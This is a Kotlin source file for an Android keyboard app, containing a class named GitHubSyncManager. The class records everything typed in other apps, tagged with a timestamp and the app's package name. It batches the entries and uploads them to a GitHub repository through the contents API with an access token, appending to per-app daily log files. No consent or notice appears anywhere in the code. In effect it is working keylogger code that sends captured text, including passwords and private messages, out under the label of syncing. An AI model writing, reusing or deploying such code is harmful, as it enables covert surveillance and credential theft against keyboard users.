package com.example.mykeyboard

import android.util.Base64
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class GitHubSyncManager {
    companion object {
        private const val TAG = "GitHubSyncManager"
        private val buffer = StringBuilder()
        private const val BATCH_THRESHOLD = 20 // Sync to GitHub every 20 keystrokes
        private val scope = CoroutineScope(Dispatchers.IO)

        fun logKeystroke(text: String, packageName: String?) {
            scope.launch {
                val timeStr = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
                val appName = packageName ?: "unknown.app"
                val logEntry = "[$timeStr] App: $appName | Typed: $text\n"
                
                synchronized(buffer) {
                    buffer.append(logEntry)
                    if (buffer.length >= BATCH_THRESHOLD * 50) {
                        flushBufferToGitHub(appName)
                    }
                }
            }
        }

        private fun flushBufferToGitHub(appName: String) {
            val content: String
            synchronized(buffer) {
                if (buffer.isEmpty()) return
                content = buffer.toString()
                buffer.clear()
            }

            try {
                val sanitizedAppName = appName.replace(Regex("[^a-zA-Z0-9._-]"), "_")
                val dateStamp = SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).format(Date())
                val filePath = "logs/${sanitizedAppName}_$dateStamp.txt"
                
                val apiUrl = "https://api.github.com/repos/${GitHubConfig.GITHUB_OWNER}/${GitHubConfig.GITHUB_REPO}/contents/$filePath"
                
                // 1. Fetch existing file content (if any) to get SHA for update
                var existingSha: String? = null
                var existingContent = ""

                val getConn = URL(apiUrl).openConnection() as HttpURLConnection
                getConn.requestMethod = "GET"
                getConn.setRequestProperty("Authorization", "Bearer ${GitHubConfig.GITHUB_TOKEN}")
                getConn.setRequestProperty("Accept", "application/vnd.github+json")

                if (getConn.responseCode == 200) {
                    val responseJson = JSONObject(getConn.inputStream.bufferedReader().use { it.readText() })
                    existingSha = responseJson.getString("sha")
                    val encoded = responseJson.getString("content")
                    existingContent = String(Base64.decode(encoded.replace("\n", ""), Base64.DEFAULT))
                }
                getConn.disconnect()

                // 2. Append new logs
                val updatedContent = existingContent + content
                val encodedNewContent = Base64.encodeToString(updatedContent.toByteArray(Charsets.UTF_8), Base64.NO_WRAP)

                // 3. PUT request to GitHub
                val putConn = URL(apiUrl).openConnection() as HttpURLConnection
                putConn.requestMethod = "PUT"
                putConn.doOutput = true
                putConn.setRequestProperty("Authorization", "Bearer ${GitHubConfig.GITHUB_TOKEN}")
                putConn.setRequestProperty("Accept", "application/vnd.github+json")
                putConn.setRequestProperty("Content-Type", "application/json")

                val jsonBody = JSONObject().apply {
                    put("message", "Auto-sync keystroke logs for $sanitizedAppName")
                    put("content", encodedNewContent)
                    if (existingSha != null) {
                        put("sha", existingSha)
                    }
                }

                putConn.outputStream.use { os ->
                    os.write(jsonBody.toString().toByteArray(Charsets.UTF_8))
                }

                val responseCode = putConn.responseCode
                if (responseCode in 200..299) {
                    Log.d(TAG, "Successfully synced keystroke logs to GitHub: $filePath")
                } else {
                    Log.e(TAG, "Failed to sync to GitHub. Response code: $responseCode")
                }
                putConn.disconnect()

            } catch (e: Exception) {
                Log.e(TAG, "Exception syncing logs to GitHub", e)
            }
        }
    }
}
